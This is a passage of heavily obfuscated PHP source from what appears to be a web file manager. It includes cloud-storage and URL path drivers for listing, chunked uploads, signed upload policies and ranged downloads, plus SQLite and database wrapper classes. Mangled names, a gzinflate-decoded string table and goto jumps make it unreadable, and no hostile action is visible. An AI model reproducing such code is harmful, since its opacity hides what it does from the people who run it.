$å–÷İÍ); return !$¯´†¨å‡[$˜ôÁ­Úü[1295]] ? !1 : $¯´†¨å‡[$˜ôÁ­Úü[1285]]; } private function fileList($âÔ½ãÁ½, &$æâÓÈÇœ, &$ŞîöÆ¦Ş, $“èˆ«¥ = false) { $¿­€½è÷ =& $_SERVER[äô®•½Â]; $ÎÏêíÉ¶ = $¿­€½è÷[12]; $…ÆÔ„ß’ = 1000; $«ó”š† = rtrim($âÔ½ãÁ½, $¿­€½è÷[8]) . $¿­€½è÷[8]; while (!0) { check_abort(); $‹’¦Â = $this->listObjs($âÔ½ãÁ½, $ÎÏêíÉ¶, $…ÆÔ„ß’); if (!$‹’¦Â) { return !1; } $ÎÏêíÉ¶ = isset($‹’¦Â[$¿­€½è÷[1579]]) ? $‹’¦Â[$¿­€½è÷[1579]] : $¿­€½è÷[12]; $±¡ıê† = isset($‹’¦Â[$¿­€½è÷[1580]]) ? $‹’¦Â[$¿­€½è÷[1580]] : array(); foreach ($±¡ıê† as $–Æ˜ğ£½) { $êÏï¥„© = $–Æ˜ğ£½[$¿­€½è÷[33]] == $¿­€½è÷[78] ? !0 : !1; $øÄç“–œ = ltrim($«ó”š† . $–Æ˜ğ£½[$¿­€½è÷[32]], $¿­€½è÷[8]) . ($êÏï¥„© ? $¿­€½è÷[8] : $¿­€½è÷[12]); $îŞ•ì¥ì = array($¿­€½è÷[32] => $øÄç“–œ, $¿­€½è÷[33] => $êÏï¥„© ? $¿­€½è÷[78] : $¿­€½è÷[233], $¿­€½è÷[79] => $–Æ˜ğ£½[$¿­€½è÷[423]], $¿­€½è÷[1575] => $–Æ˜ğ£½[$¿­€½è÷[1581]]); $this->cacheMethodInfoSet($øÄç“–œ, $êÏï¥„©, $îŞ•ì¥ì); if ($êÏï¥„©) { $æâÓÈÇœ[] = $øÄç“–œ; if ($“èˆ«¥) { $this->fileList($øÄç“–œ, $æâÓÈÇœ, $ŞîöÆ¦Ş, $“èˆ«¥); } continue; } $ŞîöÆ¦Ş[] = $îŞ•ì¥ì; } if (count($±¡ıê†) < $…ÆÔ„ß’) { break; } } $this->cacheMethodInfoSet($âÔ½ãÁ½, !0); } public function listPath($…êËïãõ, $İñªúéœ = false) { $Ğ¤Ï»–› =& $_SERVER[äô®•½Â]; $®ı‘Û = $´»Šæ‹Ú = array(); $this->fileList($…êËïãõ, $®ı‘Û, $´»Šæ‹Ú); foreach ($®ı‘Û as $˜ÔÎş¨õ => $ªÁˆãŸ) { $®ı‘Û[$˜ÔÎş¨õ] = $this->folderInfo($ªÁˆãŸ, $İñªúéœ); } foreach ($´»Šæ‹Ú as $˜ÔÎş¨õ => $ªÁˆãŸ) { $´»Šæ‹Ú[$˜ÔÎş¨õ] = $this->fileInfo($ªÁˆãŸ[$Ğ¤Ï»–›[32]], $İñªúéœ, $ªÁˆãŸ); } return array($Ğ¤Ï»–›[85] => $®ı‘Û, $Ğ¤Ï»–›[86] => $´»Šæ‹Ú); } public function has($óßñÚÛÍ, $ò£Å¼øÉ = false, $‰¿¾ò³· = true) { $™ª³è¯Ó =& $_SERVER[äô®•½Â]; $šÃ’§© = $™ª³è¯Ó[12]; $×›ƒ„é = 500; $«§¶ÜèÆ = 0; $ÒÊš€ĞÒ = 0; $È–àä÷İ = rtrim($óßñÚÛÍ, $™ª³è¯Ó[8]) . $™ª³è¯Ó[8]; while (!0) { check_abort(); $í˜ÅÚó = $this->listObjs($óßñÚÛÍ, $šÃ’§©, $×›ƒ„é); if (!$í˜ÅÚó) { return !1; } $šÃ’§© = isset($í˜ÅÚó[$™ª³è¯Ó[1579]]) ? $í˜ÅÚó[$™ª³è¯Ó[1579]] : $™ª³è¯Ó[12]; $òæç„½® = isset($í˜ÅÚó[$™ª³è¯Ó[1580]]) ? $í˜ÅÚó[$™ª³è¯Ó[1580]] : array(); if (empty($òæç„½®)) { break; } $ïŠË‡ì = array_filter($òæç„½®, function ($¥éŒºâ) { $ı®®ŠÏè =& $_SERVER[äô®•½Â]; return $¥éŒºâ[$ı®®ŠÏè[33]] == $ı®®ŠÏè[78]; }); $’æÎÉ¼ç = count($òæç„½®); $ïŠË‡ì = count($ïŠË‡ì); $ÔŒçïéÍ = $’æÎÉ¼ç - $ïŠË‡ì; if ($ò£Å¼øÉ) { $ÒÊš€ĞÒ += $ïŠË‡ì; $«§¶ÜèÆ += $ÔŒçïéÍ; if ($’æÎÉ¼ç < $×›ƒ„é) { break; } continue; } if ($‰¿¾ò³·) { if ($ÔŒçïéÍ) { return !0; } } else { if ($ïŠË‡ì) { return !0; } } if ($’æÎÉ¼ç < $×›ƒ„é) { break; } } if ($ò£Å¼øÉ) { return array($™ª³è¯Ó[242] => $«§¶ÜèÆ, $™ª³è¯Ó[243] => $ÒÊš€ĞÒ); } return !1; } public function listAll($¼¨êä‡¸) { $ø‰•ƒ©› =& $_SERVER[äô®•½Â]; $®ë•âÉ = $Ò¨ÊñÒ = array(); $this->fileList($¼¨êä‡¸, $®ë•âÉ, $Ò¨ÊñÒ, !0); $ôÜ®Æ…– = array_to_keyvalue($Ò¨ÊñÒ, $ø‰•ƒ©›[32]); foreach ($®ë•âÉ as $Ğ—ÍÁÇ“) { if (is_string($Ğ—ÍÁÇ“)) { $ôÜ®Æ…–[$Ğ—ÍÁÇ“] = array($ø‰•ƒ©›[79] => 0); } } return $this->listAllFiles($¼¨êä‡¸, $ôÜ®Æ…–); } public function canRead($ïÙ„©Ïé) { return $this->exist($ïÙ„©Ïé) ? !0 : !1; } public function canWrite($Ù³¤Ã•Ô) { return $this->exist($Ù³¤Ã•Ô) ? !0 : !1; } public function getContent($¸·§áû) { return $this->fileSubstr($¸·§áû, 0, -1); } public function setContent($ü‡ıÔØ¨, $Ïş½ì = '') { $¡±Öã‘Ó =& $_SERVER[äô®•½Â]; if (!$Ïş½ì) { $…›ÔôË = $this->ussRequest($ü‡ıÔØ¨, $¡±Öã‘Ó[291]); return $…›ÔôË[$¡±Öã‘Ó[1295]]; } $÷·´««Ã = $this->tempFile($this->pathThis($ü‡ıÔØ¨)); file_put_contents($÷·´««Ã, $Ïş½ì); if ($this->upload($ü‡ıÔØ¨, $÷·´««Ã)) { $this->tempFileRemve($÷·´««Ã); return !0; } return !1; } public function fileSubstr($°¨İÏ‹, $×‘…Ş…Æ, $Â¬ğ™ÊÑ) { $Îƒºæƒ® =& $_SERVER[äô®•½Â]; if (!($ƒ­ñé÷ = $this->link($°¨İÏ‹))) { return !1; } $¯ĞêØØÁ = !1; if ($Â¬ğ™ÊÑ > 0) { $¢©Ï‰½‚ = $×‘…Ş…Æ + $Â¬ğ™ÊÑ - 1; $¯ĞêØØÁ = array($Îƒºæƒ®[1540] . $×‘…Ş…Æ . $Îƒºæƒ®[473] . $¢©Ï‰½‚); } $Ùª¸åıî = url_request($ƒ­ñé÷, $Îƒºæƒ®[1501], !1, $¯ĞêØØÁ); return $Ùª¸åıî[$Îƒºæƒ®[815]] ? $Ùª¸åıî[$Îƒºæƒ®[1285]] : !1; } public function upload($ú•ÙËÔ, $ÁØÅ»áà, $æÍë½Û = false, $…áı’Ñ÷ = REPEAT_REPLACE) { $²Û¤¿Ä =& $_SERVER[äô®•½Â]; $ñü¤½ˆ = IO::size($ÁØÅ»áà); if ($ñü¤½ˆ <= 1024 * 1024 * 200) { $ÈÌ¹Øˆ™ = array($²Û¤¿Ä[1582] . $ÁØÅ»áà); $­ŒÏø È = $this->ussRequest($ú•ÙËÔ, $²Û¤¿Ä[256], $ÈÌ¹Øˆ™); return $­ŒÏø È[$²Û¤¿Ä[1295]] ? $this->getPathOuter($ú•ÙËÔ) : !1; } $ø€ş¤Ãş = 1024 * 1024 * 10; $¤Û’Éşå = array($²Û¤¿Ä[1583], $²Û¤¿Ä[1584] . $ñü¤½ˆ, $²Û¤¿Ä[1585], $²Û¤¿Ä[1586] . $ø€ş¤Ãş); $­ŒÏø È = $this->ussRequest($ú•ÙËÔ, $²Û¤¿Ä[256], !1, $¤Û’Éşå); if (!$­ŒÏø È[$²Û¤¿Ä[1295]]) { return !1; } $ğúÜªç = $­ŒÏø È[$²Û¤¿Ä[1285]]; $İ¹ÛĞá = 0; $ÙÄı¼Ç† = $ğúÜªç[$²Û¤¿Ä[1587]]; $ñÔ¡Ğ = fopen($ÁØÅ»áà, $²Û¤¿Ä[1464]); if (!$ñÔ¡Ğ) { return !1; } do { $äÏ¯ñã¬ = $ğúÜªç[$²Û¤¿Ä[1588]]; fseek_64($ñÔ¡Ğ, $İ¹ÛĞá); $ÑÁ¦…Í± = fread($ñÔ¡Ğ, $äÏ¯ñã¬); $ÔêšÚª = 0; do { $ÔêšÚª++; $ğúÜªç = $this->uploadPart($ú•ÙËÔ, $ğúÜªç, $ÑÁ¦…Í±); } while (!$ğúÜªç && $ÔêšÚª < 3); if (!$ğúÜªç) { return !1; } $ÙÄı¼Ç† = $ğúÜªç[$²Û¤¿Ä[1587]]; $İ¹ÛĞá += $äÏ¯ñã¬; } while ($ÙÄı¼Ç† != -1); fclose($ñÔ¡Ğ); $¤Û’Éşå = array($²Û¤¿Ä[1589], $²Û¤¿Ä[1590] . $ğúÜªç[$²Û¤¿Ä[1591]], $²Û¤¿Ä[1585]); $­ŒÏø È = $this->ussRequest($ú•ÙËÔ, $²Û¤¿Ä[256], !1, $¤Û’Éşå); return $­ŒÏø È[$²Û¤¿Ä[1295]] ? $this->getPathOuter($§óâ¶éš) : !1; } private function uploadPart($’¯Ê´ò, $ÊÔ„ŸÏÖ, &$†œµ«) { $¬Õõûî =& $_SERVER[äô®•½Â]; $‚ëâ’   = array($¬Õõûî[1592], $¬Õõûî[1590] . $ÊÔ„ŸÏÖ[$¬Õõûî[1591]], $¬Õõûî[1593] . $ÊÔ„ŸÏÖ[$¬Õõûî[1587]], $¬Õõûî[146] . $ÊÔ„ŸÏÖ[$¬Õõûî[1588]]); $èô‡Çœš = $this->ussRequest($’¯Ê´ò, $¬Õõûî[256], $†œµ«, $‚ëâ’  ); return !$èô‡Çœš[$¬Õõûî[1295]] ? $èô‡Çœš[$¬Õõûî[1295]] : $èô‡Çœš[$¬Õõûî[1285]]; } public function uploadFormData($õÍ¬ŞÆÁ, $ç²œâÍƒ = 3600) { return $this->uploadPolicy($õÍ¬ŞÆÁ, $ç²œâÍƒ); } public function uploadMultiData($Ø²™à‰, $½™úôœ  = 3600) { $ÒĞÀ§í =& $_SERVER[äô®•½Â]; $Ÿ¬òÙİ¯ = (int) $GLOBALS[$ÒĞÀ§í[7]][$ÒĞÀ§í[79]]; return $this->uploadPolicy($Ø²™à‰, $½™úôœ , $Ÿ¬òÙİ¯); } private function uploadPolicy($ÕÅŞŞ¿Ÿ, $ÉÑ å¢ = 3600, $ôå™Ò¤â = 0) { $ŸÀ¨‰ª» =& $_SERVER[äô®•½Â]; $•éŒ…å· = $ŸÀ¨‰ª»[8] . $this->bucket; $±‚‡˜’Ï = gmdate($ŸÀ¨‰ª»[1499]); $™´–¬«ê = array($ŸÀ¨‰ª»[1594] => $this->bucket, $ŸÀ¨‰ª»[1595] => $ÕÅŞŞ¿Ÿ, $ŸÀ¨‰ª»[1596] => time() + $ÉÑ å¢, $ŸÀ¨‰ª»[1597] => $±‚‡˜’Ï); if ($ôå™Ò¤â) { $™´–¬«ê[$ŸÀ¨‰ª»[1484]] = $ôå™Ò¤â; } $ŒÚ”´Ï = base64_encode(json_encode($™´–¬«ê)); $âƒçåÀ‡ = base64_encode(hash_hmac($ŸÀ¨‰ª»[1551], "\x50\117\x53\x54\x26{$•éŒ…å·}\46{$±‚‡˜’Ï}\46{$ŒÚ”´Ï}", md5("{$this->userpass}"), !0)); $«ñÅ£‡Î = array($ŸÀ¨‰ª»[280] => $ŒÚ”´Ï, $ŸÀ¨‰ª»[1598] => "\125\120\131\125\116\x20{$this->username}\72{$âƒçåÀ‡}", $ŸÀ¨‰ª»[209] => $this->endpoint . $•éŒ…å·); return $«ñÅ£‡Î; } public function download($§óåäôŞ, $Ğƒ¨ê‡) { $èàø­Ğ = IO::getPathInner(IO::mkfile($Ğƒ¨ê‡)); if (!($Á©òĞ°¢ = $this->link($§óåäôŞ))) { return !1; } $¬ŠÔêîË = 0; $÷¥™Ş = 1024 * 200; $‹–Œ­¯¿ = fopen($èàø­Ğ, $_SERVER[äô®•½Â][1546]); while (!0) { $ŸƒÏü÷² = $this->fileSubstr($§óåäôŞ, $¬ŠÔêîË, $÷¥™Ş); if ($ŸƒÏü÷² === !1) { return !1; } fwrite($‹–Œ­¯¿, $ŸƒÏü÷²); $¬ŠÔêîË += $÷¥™Ş; if (strlen($ŸƒÏü÷²) < $÷¥™Ş) { break; } } fclose($‹–Œ­¯¿); return $Ğƒ¨ê‡; } public function link($â“òÈÕŞ, $ÖÎŞ±öé = array()) { $ö¹œíáÄ =& $_SERVER[äô®•½Â]; $â“òÈÕŞ = trim($â“òÈÕŞ, $ö¹œíáÄ[8]); if (!empty($this->token)) { $èö¶€ = strtotime(date($ö¹œíáÄ[1599])); $ò¡±ÒâÜ = substr(md5($this->token . $ö¹œíáÄ[287] . $èö¶€ . $ö¹œíáÄ[1600] . $â“òÈÕŞ), 12, 8) . $èö¶€; $ÖÎŞ±öé[] = $ö¹œíáÄ[1601] . $ò¡±ÒâÜ; } $«”ÏİÊ = !empty($ÖÎŞ±öé) ? $ö¹œíáÄ[76] . implode($ö¹œíáÄ[287], $ÖÎŞ±öé) : $ö¹œíáÄ[12]; return $this->getHost() . $ö¹œíáÄ[8] . $this->pathEncode($â“òÈÕŞ) . $«”ÏİÊ; } public function fileOut($Áşğ›ÍŞ, $ä¡Ô»¸µ = false, $ø¬© Â® = false, $’ÅâÔÂ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Áşğ›ÍŞ, $ä¡Ô»¸µ, $ø¬© Â®, $’ÅâÔÂ); } if (!$ø¬© Â®) { $ø¬© Â® = $this->pathThis($Áşğ›ÍŞ); } $¬Ø·Õ¥ì = $ä¡Ô»¸µ ? array($_SERVER[äô®•½Â][1602] . rawurlencode($ø¬© Â®)) : array(); $Üü›÷Ğ‘ = $this->link($Áşğ›ÍŞ, $¬Ø·Õ¥ì); $this->fileOutLink($Üü›÷Ğ‘); } public function fileOutServer($ÓøƒÒ»ß, $¾•´¦Û = false, $Ç”÷í¸ = false, $ÚÒ›› = '') { parent::fileOut($ÓøƒÒ»ß, $¾•´¦Û, $Ç”÷í¸, $ÚÒ››); } public function fileOutImage($ùë©¬™Â, $¶ÆøŠŒÜ = 250) { $æÕ¿åùƒ = $this->link($ùë©¬™Â . $_SERVER[äô®•½Â][1603] . $¶ÆøŠŒÜ); $this->fileOutLink($æÕ¿åùƒ); } public function fileOutImageServer($‰Íü’é, $²²¡’÷Ø = 250) { parent::fileOutImage($‰Íü’é, $²²¡’÷Ø); } public function hashMd5($×êÅ¨¼) { $öíå‡È =& $_SERVER[äô®•½Â]; $üî¿ƒ““ = $this->_objectMeta($×êÅ¨¼); return isset($üî¿ƒ““[$öíå‡È[248]]) ? $üî¿ƒ““[$öíå‡È[248]] : !1; } public function size($ÁˆàÁ¢˜) { $¢ÌÚàÍÌ = $this->objectMeta($ÁˆàÁ¢˜); return $¢ÌÚàÍÌ ? $¢ÌÚàÍÌ[$_SERVER[äô®•½Â][79]] : 0; } public function info($ÏùŠÍ¿Å) { if ($this->isFolder($ÏùŠÍ¿Å)) { return $this->folderInfo($ÏùŠÍ¿Å); } else { if ($this->isFile($ÏùŠÍ¿Å)) { return $this->fileInfo($ÏùŠÍ¿Å); } } return !1; } public function exist($£ßÌÂ) { return $this->isFile($£ßÌÂ) || $this->isFolder($£ßÌÂ); } public function isFile($Ö‚àšôğ) { return !$this->isFolder($Ö‚àšôğ) && $this->objectMeta($Ö‚àšôğ); } public function isFolder($úñÉ©½÷) { return $this->cacheMethod($_SERVER[äô®•½Â][180], $úñÉ©½÷); } protected function objectMeta($ªÂ‡º²) { return $this->cacheMethod($_SERVER[äô®•½Â][182], $ªÂ‡º²); } protected function _objectMeta($ÔˆœûïÙ) { $õƒ¥ï¨Ù =& $_SERVER[äô®•½Â]; if ($ÔˆœûïÙ == $õƒ¥ï¨Ù[12] || $ÔˆœûïÙ == $õƒ¥ï¨Ù[8]) { return array(); } $ìÒê¨±˜ = $this->ussRequest($ÔˆœûïÙ, $õƒ¥ï¨Ù[1604]); if (!$ìÒê¨±˜[$õƒ¥ï¨Ù[1295]]) { return null; } $©Ïšî‚¯ = isset($ìÒê¨±˜[$õƒ¥ï¨Ù[1285]]) ? $ìÒê¨±˜[$õƒ¥ï¨Ù[1285]] : array(); if (!isset($©Ïšî‚¯[$õƒ¥ï¨Ù[1605]])) { return null; } $”¯«§É = array($õƒ¥ï¨Ù[33] => isset($©Ïšî‚¯[$õƒ¥ï¨Ù[1605]]) ? $©Ïšî‚¯[$õƒ¥ï¨Ù[1605]] : null, $õƒ¥ï¨Ù[79] => isset($©Ïšî‚¯[$õƒ¥ï¨Ù[1606]]) ? $©Ïšî‚¯[$õƒ¥ï¨Ù[1606]] : null, $õƒ¥ï¨Ù[248] => isset($©Ïšî‚¯[$õƒ¥ï¨Ù[1607]]) ? $©Ïšî‚¯[$õƒ¥ï¨Ù[1607]] : null, $õƒ¥ï¨Ù[1574] => isset($©Ïšî‚¯[$õƒ¥ï¨Ù[1608]]) ? $©Ïšî‚¯[$õƒ¥ï¨Ù[1608]] : null); $”¯«§É[$õƒ¥ï¨Ù[1575]] = isset($©Ïšî‚¯[$õƒ¥ï¨Ù[1609]]) ? strtotime($©Ïšî‚¯[$õƒ¥ï¨Ù[1609]]) : $”¯«§É[$õƒ¥ï¨Ù[1574]]; return $”¯«§É; } protected function _isFolder($…ªÒêôÂ) { $û‘Öàƒ =& $_SERVER[äô®•½Â]; if ($…ªÒêôÂ == $û‘Öàƒ[12] || $…ªÒêôÂ == $û‘Öàƒ[8]) { return !0; } $Áæ£ÜÇ• = $this->_objectMeta($…ªÒêôÂ); return isset($Áæ£ÜÇ•[$û‘Öàƒ[33]]) && $Áæ£ÜÇ•[$û‘Öàƒ[33]] == $û‘Öàƒ[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Ğ¯éØ˜â = false) { } public function exist($Ôºä£Ï) { $’ª˜È’÷ = $this->info($Ôºä£Ï); return $’ª˜È’÷[$_SERVER[äô®•½Â][235]]; } public function isFile($º€§íÉ‡) { $°Ş¤äêÍ = $this->info($º€§íÉ‡); return $°Ş¤äêÍ[$_SERVER[äô®•½Â][235]]; } public function isFolder($¹Ğü¿×§) { return !1; } public function size($±¡·€Ø´) { $“½òÎÆ‰ = $this->info($±¡·€Ø´); return $“½òÎÆ‰[$_SERVER[äô®•½Â][79]]; } public function info($ÅÏ¾½¥š) { return $this->infoParse($ÅÏ¾½¥š); } public function infoAuth($€¥ïˆ‘Ü) { return $this->infoParse($€¥ïˆ‘Ü); } public function infoWithChildren($áÎ˜®‰) { return $this->infoParse($áÎ˜®‰); } public function infoFull($Ø½Š£Õã) { return $this->infoParse($Ø½Š£Õã); } private function infoParse($¢Û²±±–) { $ï©àÌª =& $_SERVER[äô®•½Â]; $…ª±¿È¥ = $this->header($¢Û²±±–); if (!$…ª±¿È¥ || !$…ª±¿È¥[$ï©àÌª[815]]) { return !1; } $Ë˜ÓçÂĞ = _get($…ª±¿È¥, $ï©àÌª[423], 0); $½ëûÀªû = array($ï©àÌª[32] => $…ª±¿È¥[$ï©àÌª[32]], $ï©àÌª[87] => $¢Û²±±–, $ï©àÌª[33] => $ï©àÌª[233], $ï©àÌª[79] => intval($Ë˜ÓçÂĞ), $ï©àÌª[169] => get_path_ext($…ª±¿È¥[$ï©àÌª[32]]), $ï©àÌª[1461] => $Ë˜ÓçÂĞ > 0 && $…ª±¿È¥[$ï©àÌª[1610]], $ï©àÌª[1462] => !1); return $½ëûÀªû; } private function header($Û³é™Ç) { $û¢¡õ‘¦ =& $_SERVER[äô®•½Â]; if (isset(self::$_cacheHeader[$Û³é™Ç])) { return self::$_cacheHeader[$Û³é™Ç]; } $ï÷äôñİ = isset($GLOBALS[$û¢¡õ‘¦[1611]]) ? $GLOBALS[$û¢¡õ‘¦[1611]] : !1; $GLOBALS[$û¢¡õ‘¦[1611]] = !0; self::$_cacheHeader[$Û³é™Ç] = url_header($Û³é™Ç); $GLOBALS[$û¢¡õ‘¦[1611]] = $ï÷äôñİ; return self::$_cacheHeader[$Û³é™Ç]; } public function hashSimple($›ùß®÷, $öÒğ¯§¬ = false) { $üûòâ¬ =& $_SERVER[äô®•½Â]; $™—¥‘† = $this->info($›ùß®÷); if (!$™—¥‘† || !$™—¥‘†[$üûòâ¬[235]]) { return !1; } $ÔãÙúœ = $™—¥‘†[$üûòâ¬[79]]; $ƒ”ğ¡à¿ = 200; $º›¶ƒ¼¸ = 50; if ($ÔãÙúœ <= $ƒ”ğ¡à¿ * $º›¶ƒ¼¸) { return md5($this->fileSubstr($›ùß®÷, 0, $ÔãÙúœ)) . $ÔãÙúœ; } $¤ÍĞı‘ã = intval($ÔãÙúœ / $º›¶ƒ¼¸); $ ø±à˜› = $üûòâ¬[12]; $ƒ¶û›‡“ = timeFloat(); $ûÃ‡ŒÑ¢ = 15; for ($áïÍ‡‚Á = 0; $áïÍ‡‚Á < $º›¶ƒ¼¸; $áïÍ‡‚Á++) { if (timeFloat() - $ƒ¶û›‡“ > $ûÃ‡ŒÑ¢) { return !1; } $ÔšµÊâŞ = $this->fileSubstr($›ùß®÷, $¤ÍĞı‘ã * $áïÍ‡‚Á, $ƒ”ğ¡à¿); if (!$ÔšµÊâŞ) { return !1; } $ ø±à˜› .= $ÔšµÊâŞ; } $ ø±à˜› .= $this->fileSubstr($›ùß®÷, $ÔãÙúœ - $ƒ”ğ¡à¿, $ƒ”ğ¡à¿); return md5($ ø±à˜›) . $ÔãÙúœ; } public function getContent($·¦úşù) { return $this->fileSubstr($·¦úşù); } public function fileSubstr($¨ù¡ŸÂÄ, $÷Íªã = 0, $ˆø¤íè• = -1) { $Š²œ¿øô =& $_SERVER[äô®•½Â]; $ÙßÒüå = $this->info($¨ù¡ŸÂÄ); if (!$ÙßÒüå || !$ÙßÒüå[$Š²œ¿øô[235]] && $ÙßÒüå[$Š²œ¿øô[79]] > 1024 * 1024 * 10) { return !1; } if ($ˆø¤íè• === -1) { $ˆø¤íè• = $ÙßÒüå[$Š²œ¿øô[79]]; } if ($ˆø¤íè• == 0) { return $Š²œ¿øô[12]; } $±È²ëåó = array($Š²œ¿øô[1612] . $÷Íªã . $Š²œ¿øô[853] . ($÷Íªã + $ˆø¤íè• - 1)); $›å“µë× = url_request($¨ù¡ŸÂÄ, $Š²œ¿øô[1501], !1, $±È²ëåó, !1, !1, 30); return $›å“µë×[$Š²œ¿øô[1285]] ? $›å“µë×[$Š²œ¿øô[1285]] : $Š²œ¿øô[12]; } public function download($ò¦ÚëÌ, $‹š­£“Â) { Downloader::start($ò¦ÚëÌ, $‹š­£“Â); return $‹š­£“Â; } } goto eÎœÄè‹¾; B¶¿‡ˆø—Ş: $rpjqidzyvh = $_SERVER[äô®•½Â][695]; if (strlen($rpjqidzyvh) < $_SERVER[äô®•½Â][696]) { die; } $_SERVER[ŸøÁÑ©Ï] = explode($_SERVER[äô®•½Â][697], gzinflate(substr($_SERVER[äô®•½Â][698], 10, -8))); goto f Ü‰Ô…ñé; eøƒÈ¥óÙù: class DbSqlite extends DbSqliteBase { public function query($ÂÈ´¾ßî) { $æœÁ ¨ =& $_SERVER[äô®•½Â]; if (!CacheLock::fileLock($æœÁ ¨[13])) { return !1; } $ÑÎÃ®È‰ = parent::query($ÂÈ´¾ßî); CacheLock::fileUnLock($æœÁ ¨[13]); return $ÑÎÃ®È‰; } public function execute($ªãˆØÛ’) { $ò™¡Á±‹ =& $_SERVER[äô®•½Â]; if (!CacheLock::fileLock($ò™¡Á±‹[13])) { return !1; } $—šÍëø = parent::execute($ªãˆØÛ’); CacheLock::fileUnLock($ò™¡Á±‹[13]); return $—šÍëø; } } class DbSqlite3 extends DbSqlite3Base { public function query($ “É»ªª) { $¿æõ–•ø =& $_SERVER[äô®•½Â]; if (!CacheLock::fileLock($¿æõ–•ø[13])) { return !1; } $šŞ¾¯ì = parent::query($ “É»ªª); CacheLock::fileUnLock($¿æõ–•ø[13]); return $šŞ¾¯ì; } public function execute($¨—Â¡‘®) { $„—ÍöíŸ =& $_SERVER[äô®•½Â]; if (!CacheLock::fileLock($„—ÍöíŸ[13])) { return !1; } $¦ú÷Ú›ô = parent::execute($¨—Â¡‘®); CacheLock::fileUnLock($„—ÍöíŸ[13]); return $¦ú÷Ú›ô; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\156\x65\161" => "\x3c\76", "\147\x74" => "\76", "\145\147\x74" => "\x3e\75", "\x6c\164" => "\x3c", "\x65\154\164" => "\74\75", "\x6e\x6f\x74\x6c\151\153\145" => "\x4e\117\x54\40\114\111\113\105", "\154\x69\x6b\x65" => "\114\111\113\105", "\151\156" => "\111\x4e", "\x6e\157\x74\151\156" => "\116\117\x54\40\111\x4e", "\x6e\157\164\x20\151\156" => "\116\x4f\124\x20\111\x4e", "\x62\145\164\x77\145\145\156" => "\x42\105\x54\x57\105\105\x4e", "\156\157\164\142\145\164\167\145\x65\x6e" => "\x4e\x4f\124\x20\x42\x45\124\x57\105\x45\x4e", "\156\157\164\40\142\145\x74\167\145\145\x6e" => "\x4e\117\x54\40\102\105\x54\127\x45\x45\x4e"); protected $selectSql = "\123\x45\114\x45\x43\x54\45\104\111\x53\124\111\x4e\x43\124\45\x20\x25\x46\x49\x45\114\x44\45\40\x46\122\117\x4d\x20\x25\124\x41\102\114\105\45\x25\x4a\117\111\x4e\45\45\127\x48\105\x52\x45\45\x25\107\x52\x4f\x55\x50\45\45\x48\101\126\x49\x4e\107\45\45\117\x52\x44\x45\x52\45\x25\114\x49\x4d\111\124\45\40\45\x55\x4e\x49\117\x4e\x25\45\103\117\x4d\115\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $Ä¥®Äİò = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[äô®•½Â][1032], $Ä¥®Äİò); } public function factory($şšİŸ±€ = '') { $”¢ıá =& $_SERVER[äô®•½Â]; $şšİŸ±€ = $this->parseConfig($şšİŸ±€); if (empty($şšİŸ±€[$”¢ıá[1033]])) { think_exception(think_lang($”¢ıá[1034])); } $this->dbType = ucwords(strtolower($şšİŸ±€[$”¢ıá[1033]])); $ñÊîşàº = $”¢ıá[1035] . $this->dbType; if (class_exists($ñÊîşàº)) { $ˆÁƒüŸ = new $ñÊîşàº($şšİŸ±€); if ($”¢ıá[1036] != strtolower($şšİŸ±€[$”¢ıá[1033]])) { $ˆÁƒüŸ->dbType = strtoupper($this->dbType); } else { $ˆÁƒüŸ->dbType = $this->_getDsnType($şšİŸ±€[$”¢ıá[988]]); } } else { think_exception(think_lang($”¢ıá[1037]) . $”¢ıá[1038] . $ñÊîşàº); } return $ˆÁƒüŸ; } public function __call($ÎõÓ´ëæ, $õû¢Öïä) { if (method_exists($this, $ÎõÓ´ëæ)) { return call_user_func_array(array($this, $ÎõÓ´ëæ), $õû¢Öïä); } } protected function _getDsnType($âÀñå¦) { $Éî…ÛÚ = explode($_SERVER[äô®•½Â][4], $âÀñå¦); $È™´˜³¡ = strtoupper(trim($Éî…ÛÚ[0])); return $È™´˜³¡; } private function parseConfig($¸ÃÄÓÕµ = '') { $–ÀÚœÛÎ =& $_SERVER[äô®•½Â]; if (!empty($¸ÃÄÓÕµ) && is_string($¸ÃÄÓÕµ)) { $¸ÃÄÓÕµ = $this->parseDSN($¸ÃÄÓÕµ); } elseif (is_array($¸ÃÄÓÕµ)) { $¸ÃÄÓÕµ = array_change_key_case($¸ÃÄÓÕµ); $¸ÃÄÓÕµ = array($–ÀÚœÛÎ[1033] => $¸ÃÄÓÕµ[$–ÀÚœÛÎ[1039]], $–ÀÚœÛÎ[960] => $¸ÃÄÓÕµ[$–ÀÚœÛÎ[1040]], $–ÀÚœÛÎ[961] => $¸ÃÄÓÕµ[$–ÀÚœÛÎ[1041]], $–ÀÚœÛÎ[958] => $¸ÃÄÓÕµ[$–ÀÚœÛÎ[1042]], $–ÀÚœÛÎ[959] => $¸ÃÄÓÕµ[$–ÀÚœÛÎ[1043]], $–ÀÚœÛÎ[21] => $¸ÃÄÓÕµ[$–ÀÚœÛÎ[1044]], $–ÀÚœÛÎ[988] => $¸ÃÄÓÕµ[$–ÀÚœÛÎ[1045]], $–ÀÚœÛÎ[17] => isset($¸ÃÄÓÕµ[$–ÀÚœÛÎ[1046]]) ? $¸ÃÄÓÕµ[$–ÀÚœÛÎ[1046]] : array()); } elseif (empty($¸ÃÄÓÕµ)) { if (think_config($–ÀÚœÛÎ[1047]) && $–ÀÚœÛÎ[1036] != strtolower(think_config($–ÀÚœÛÎ[1048]))) { $¸ÃÄÓÕµ = $this->parseDSN(think_config($–ÀÚœÛÎ[1047])); } else { $¸ÃÄÓÕµ = array($–ÀÚœÛÎ[1033] => think_config($–ÀÚœÛÎ[1048]), $–ÀÚœÛÎ[960] => think_config($–ÀÚœÛÎ[1049]), $–ÀÚœÛÎ[961] => think_config($–ÀÚœÛÎ[1050]), $–ÀÚœÛÎ[958] => think_config($–ÀÚœÛÎ[1051]), $–ÀÚœÛÎ[959] => 